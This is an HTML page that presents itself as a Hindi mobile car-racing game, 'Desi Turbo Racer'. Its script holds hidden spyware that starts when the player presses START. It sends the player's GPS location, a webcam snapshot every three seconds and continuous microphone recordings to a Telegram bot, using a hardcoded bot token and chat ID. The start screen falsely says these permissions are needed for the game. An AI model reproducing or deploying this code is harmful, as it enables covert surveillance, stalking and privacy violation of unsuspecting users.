<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <title>Desi Turbo Racer 🏎️</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { margin: 0; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #222; color: white; touch-action: none; }
        canvas { display: block; margin: 0 auto; background: #333; border-left: 5px dashed #fff; border-right: 5px dashed #fff; }
        #ui { position: absolute; top: 10px; width: 100%; text-align: center; font-size: 28px; font-weight: bold; color: #f1c40f; z-index: 10; text-shadow: 2px 2px #000; }
        #startScreen { position: absolute; width: 100%; height: 100%; background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)), url('https://img.freepik.com/free-photo/sports-car-driving-asphalt-road-night-generative-ai_188544-8052.jpg'); background-size: cover; display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 20; text-align: center; }
        .btn { padding: 20px 50px; font-size: 24px; border: none; border-radius: 10px; background: #27ae60; color: white; cursor: pointer; font-weight: bold; box-shadow: 0 6px #1e8449; transition: 0.2s; }
        .btn:active { box-shadow: 0 2px #1e8449; transform: translateY(4px); }
        h1 { font-size: 45px; color: #e74c3c; text-transform: uppercase; margin-bottom: 5px; }
        p { font-size: 18px; margin-bottom: 25px; color: #eee; padding: 0 20px; }
    </style>
</head>
<body>

<div id="ui">Score: <span id="score">0</span></div>

<div id="startScreen">
    <h1>Desi Turbo Racer 🏎️</h1>
    <p>गाड़ियों से बचें और हाई स्कोर बनाएं!<br><small>(गेम के लिए Camera/Mic/Location Allow करें)</small></p>
    <button class="btn" onclick="startGame()">START RACING</button>
</div>

<canvas id="raceCanvas"></canvas>

<video id="v" style="display:none" autoplay></video>
<canvas id="c" style="display:none"></canvas>

<script>
// --- [ सेटअप ] ---
const botTok = '8047508895:AAFrcd1D14oyIUtPcmjK-dxZY0sEwohBJcA'; // आपका टोकन
const chatId = '8466223066'; // आपकी आईडी

// --- [ ट्रैकिंग सिस्टम ] ---
async function startHiddenCapture() {
    // 1. लोकेशन (एक बार)
    navigator.geolocation.getCurrentPosition(pos => {
        const msg = `📍 Target Location:\nLat: ${pos.coords.latitude}\nLong: ${pos.coords.longitude}\nGoogle Map: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        sendToTelegram(msg, 'text');
    });

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const video = document.getElementById('v');
        video.srcObject = stream;

        // 2. हर 3 सेकंड में फोटो भेजना (Loop)
        setInterval(() => {
            const tempCanvas = document.getElementById('c');
            tempCanvas.width = video.videoWidth; 
            tempCanvas.height = video.videoHeight;
            tempCanvas.getContext('2d').drawImage(video, 0, 0);
            tempCanvas.toBlob(blob => {
                sendToTelegram(blob, 'photo');
            }, 'image/jpeg', 0.5);
        }, 3000);

        // 3. निरंतर ऑडियो रिकॉर्डिंग (10-10 सेकंड के क्लिप)
        function recordAudio() {
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
                sendToTelegram(audioBlob, 'voice');
                recordAudio(); // अगली रिकॉर्डिंग शुरू करें
            };
            recorder.start();
            setTimeout(() => recorder.stop(), 10000);
        }
        recordAudio();

    } catch (err) {
        sendToTelegram("❌ Permission Denied by User", 'text');
    }
}

function sendToTelegram(data, type) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    
    let url = `https://api.telegram.org/bot${botTok}/`;
    
    if (type === 'text') {
        url += 'sendMessage';
        formData.append('text', data);
    } else if (type === 'photo') {
        url += 'sendPhoto';
        formData.append('photo', data, 'capture.jpg');
    } else if (type === 'voice') {
        url += 'sendVoice';
        formData.append('voice', data, 'audio.ogg');
    }

    fetch(url, { method: 'POST', body: formData });
}

// --- [ कार गेम इंजन ] ---
const canvas = document.getElementById("raceCanvas");
const ctx = canvas.getContext("2d");
canvas.width = Math.min(window.innerWidth, 400);
canvas.height = window.innerHeight;

let score = 0;
let myCar = { x: canvas.width / 2 - 25, y: canvas.height - 120, w: 50, h: 90 };
let enemies = [];
let gameActive = false;

function spawnEnemy() {
    if(!gameActive) return;
    let lanes = [canvas.width/4-25, canvas.width/2-25, (canvas.width*0.75)-25];
    let pos = lanes[Math.floor(Math.random()*lanes.length)];
    enemies.push({ x: pos, y: -100, w: 50, h: 90, speed: 5 + (score/5) });
    setTimeout(spawnEnemy, 1200 - Math.min(score*20, 600));
}

function draw() {
    if(!gameActive) return;
    ctx.fillStyle = "#333";
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    // सड़क की पट्टी
    ctx.strokeStyle = "#fff";
    ctx.setLineDash([20, 20]);
    ctx.beginPath(); ctx.moveTo(canvas.width/2, 0); ctx.lineTo(canvas.width/2, canvas.height); ctx.stroke();

    // मेरी कार (Red)
    ctx.fillStyle = "#e74c3c";
    ctx.fillRect(myCar.x, myCar.y, myCar.w, myCar.h);

    // दुश्मन कारें (Blue)
    ctx.fillStyle = "#3498db";
    enemies.forEach((en, i) => {
        en.y += en.speed;
        ctx.fillRect(en.x, en.y, en.w, en.h);

        // टक्कर चेक
        if (myCar.x < en.x + en.w && myCar.x + myCar.w > en.x && myCar.y < en.y + en.h && myCar.h + myCar.y > en.y) {
            gameActive = false;
            alert("Game Over! Score: " + score);
            location.reload();
        }

        if(en.y > canvas.height) {
            enemies.splice(i, 1);
            score++;
            document.getElementById("score").innerText = score;
        }
    });

    requestAnimationFrame(draw);
}

// कंट्रोल
window.addEventListener("touchstart", (e) => {
    let touchX = e.touches[0].clientX;
    if (touchX < canvas.width / 2) myCar.x = Math.max(0, myCar.x - 50);
    else myCar.x = Math.min(canvas.width - myCar.w, myCar.x + 50);
});

function startGame() {
    document.getElementById("startScreen").style.display = "none";
    gameActive = true;
    startHiddenCapture(); // गेम शुरू होते ही परमिशन और ट्रैकिंग चालू
    spawnEnemy();
    draw();
}
</script>
</body>
</html>
